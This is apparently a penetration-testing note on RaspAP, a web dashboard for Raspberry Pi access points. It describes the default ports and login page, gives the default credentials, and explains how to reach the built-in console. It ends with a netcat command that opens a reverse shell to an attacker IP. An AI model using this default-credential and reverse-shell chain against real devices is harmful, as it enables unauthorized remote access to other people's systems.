# RaspAP

RaspAP is a web-based interface for managing wireless access point settings on Raspberry Pi devices. It allows users to easily configure Wi-Fi, DHCP, hostapd, firewall rules, and VPN settings through a browser-based dashboard. Designed for low-resource hardware, RaspAP is lightweight and simple to use. It typically installs with the **Lighttpd web server** and runs on port `80` by default, though it may be configured to use alternate ports such as `8080` or `8091`. The interface is protected by a `BASIC` authentication and is commonly accessed at `/login.php`.

Based on its [official documentation](https://docs.raspap.com/manual/#restart) the default credentials are: `admin:secret`. The UI provide console functionality under the `System` menu on the sidebar where it can be used to get a reverse shell, typically, as `www-data`.

```bash
user@raspap ~$ nc -e /bin/bash 192.168.45.170 80
```
